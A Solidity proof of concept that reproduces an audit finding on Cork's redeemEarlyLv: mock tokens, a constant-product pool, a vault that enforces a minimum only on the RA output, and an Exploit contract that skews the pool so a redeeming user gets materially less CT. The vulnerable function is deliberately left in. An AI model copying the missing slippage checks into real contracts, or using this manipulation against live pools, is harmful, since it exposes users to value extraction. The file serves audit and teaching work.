// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cork — Insufficient slippage protection in redeemEarlyLv leads to MEV
    through flash swaps  (Sujith Somraaj / Cantina Cork Dec 2024, finding #53126)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: redeemEarlyLv only enforces amountOutMin against RA received
    from the AMM:
        if (result.raReceivedFromAmm < redeemParams.amountOutMin) revert ...
    CT / DS / PA outputs have NO min-out checks. An attacker can manipulate the
    RA/CT pool so the redeem still clears the RA floor while the user receives
    a worse CT (or DS) basket — value extraction on the unprotected legs.

    FIX: add ctAmountOutMin / dsAmountOutMin / paAmountOutMin checks. */

contract MockRA {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockCT {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract MockLV {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function burn(address from, uint256 amt) external {
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }
}

/// @dev RA/CT constant-product pool used during early LV redemption.
contract MockAMM {
    MockRA public immutable ra;
    MockCT public immutable ct;
    uint256 public reserveRa;
    uint256 public reserveCt;

    constructor(MockRA ra_, MockCT ct_) {
        ra = ra_;
        ct = ct_;
    }

    function seed(uint256 raAmt, uint256 ctAmt) external {
        ra.mint(address(this), raAmt);
        ct.mint(address(this), ctAmt);
        reserveRa = raAmt;
        reserveCt = ctAmt;
    }

    /// @dev Remove liquidity proportional to LV share: returns RA + CT.
    function removeLiquidity(uint256 share, uint256 total) external returns (uint256 raOut, uint256 ctOut) {
        raOut = (reserveRa * share) / total;
        ctOut = (reserveCt * share) / total;
        reserveRa -= raOut;
        reserveCt -= ctOut;
        ra.transfer(msg.sender, raOut);
        ct.transfer(msg.sender, ctOut);
    }

    /// @dev Attacker swaps RA→CT (or CT→RA) to skew the basket before redeem.
    ///      Buying CT with RA increases reserveRa and decreases reserveCt so a
    ///      subsequent proportional remove gets MORE RA and LESS CT.
    function swapRaForCt(uint256 raIn) external returns (uint256 ctOut) {
        ctOut = (reserveCt * raIn) / (reserveRa + raIn);
        ra.transferFrom(msg.sender, address(this), raIn);
        reserveRa += raIn;
        reserveCt -= ctOut;
        ct.transfer(msg.sender, ctOut);
    }
}

struct RedeemEarlyParams {
    uint256 amount; // LV to redeem
    uint256 amountOutMin; // ONLY protects RA
}

struct RedeemEarlyResult {
    uint256 raReceivedFromAmm;
    uint256 ctReceivedFromAmm;
    uint256 dsReceived;
}

/// @notice Reduced VaultCore.redeemEarlyLv — RA min only.
contract VaultCore {
    MockLV public immutable lv;
    MockAMM public immutable amm;
    MockRA public immutable ra;
    MockCT public immutable ct;

    // Notionally fixed DS leg (not pool-dependent) for the synthetic.
    uint256 public constant DS_PER_LV = 1e18;

    constructor(MockLV lv_, MockAMM amm_, MockRA ra_, MockCT ct_) {
        lv = lv_;
        amm = amm_;
        ra = ra_;
        ct = ct_;
    }

    function redeemEarlyLv(RedeemEarlyParams memory redeemParams)
        external
        returns (RedeemEarlyResult memory result)
    {
        uint256 total = lv.totalSupply();
        require(redeemParams.amount > 0 && redeemParams.amount <= lv.balanceOf(msg.sender), "bal");
        lv.burn(msg.sender, redeemParams.amount);

        // Pull proportional RA+CT from AMM (LV share of pool).
        (uint256 raOut, uint256 ctOut) = amm.removeLiquidity(redeemParams.amount, total);
        result.raReceivedFromAmm = raOut;
        result.ctReceivedFromAmm = ctOut;
        result.dsReceived = (DS_PER_LV * redeemParams.amount) / 1e18;

        // FIX: also require ctOut >= ctAmountOutMin (and DS/PA mins).
        if (result.raReceivedFromAmm < redeemParams.amountOutMin) { // @> VULN: only RA checked; CT/DS have no min
            revert("InsufficientOutputAmount");
        }

        // Deliver assets to redeemer.
        ra.transfer(msg.sender, result.raReceivedFromAmm);
        ct.transfer(msg.sender, result.ctReceivedFromAmm);
        // DS mint stand-in: mint CT-like not needed; track dsReceived only.
    }
}

contract User {
    function redeem(VaultCore vault, uint256 amount, uint256 raMin)
        external
        returns (RedeemEarlyResult memory)
    {
        return vault.redeemEarlyLv(RedeemEarlyParams({amount: amount, amountOutMin: raMin}));
    }
}

contract Attacker {
    function skew(MockRA ra, MockAMM amm, uint256 raIn) external {
        amm.swapRaForCt(raIn);
    }
}

contract Exploit {
    MockRA public ra; // 1
    MockCT public ct; // 2
    MockLV public lv; // 3
    MockAMM public amm; // 4
    VaultCore public vault; // 5
    User public user; // 6
    Attacker public attacker; // 7

    uint256 public fairRa;
    uint256 public fairCt;
    uint256 public actualRa;
    uint256 public actualCt;

    constructor() {
        ra = new MockRA();
        ct = new MockCT();
        lv = new MockLV();
        amm = new MockAMM(ra, ct);
        vault = new VaultCore(lv, amm, ra, ct);
        user = new User();
        attacker = new Attacker();

        // Pool 100/100; user holds 1 LV of 100 total (1% share).
        amm.seed(100 ether, 100 ether);
        lv.mint(address(user), 1 ether);
        lv.mint(address(0xDEAD), 99 ether); // rest of supply (idle)

        // Fair redeem quote (no manipulation): 1% of 100/100 = 1 RA + 1 CT.
        fairRa = 1 ether;
        fairCt = 1 ether;

        // Attacker funds to skew pool
        ra.mint(address(attacker), 50 ether);
    }

    function run() external {
        // Attacker flash-style skew: dump RA for CT so pool is RA-heavy / CT-light.
        // After 50 RA in on 100/100: reserveRa=150, reserveCt≈66.67.
        // User's 1% of remaining supply... wait, total LV still 100, remove 1:
        // raOut = 150 * 1/100 = 1.5, ctOut = 66.67 * 1/100 ≈ 0.667
        attacker.skew(ra, amm, 50 ether);

        // User redeems with amountOutMin set to the MANIPULATED RA (which is
        // actually HIGHER than fair) — RA check passes, but CT is worse.
        // Mirrors the report: ra still meets min while CT ratio is unfavorable.
        uint256 raMin = 1 ether; // still meets fair RA floor (actually gets more)
        RedeemEarlyResult memory result = user.redeem(vault, 1 ether, raMin);

        actualRa = result.raReceivedFromAmm;
        actualCt = result.ctReceivedFromAmm;

        // RA min satisfied
        require(actualRa >= raMin, "RA min should pass");
        // HARM: CT received is materially worse than fair, with no protection.
        require(actualCt < fairCt, "CT should be worse under skew");
        require(actualCt * 100 < fairCt * 80, "CT haircut should be material");
        // User holds the skewed basket
        require(ct.balanceOf(address(user)) == actualCt, "user CT");
        require(ra.balanceOf(address(user)) == actualRa, "user RA");
    }
}
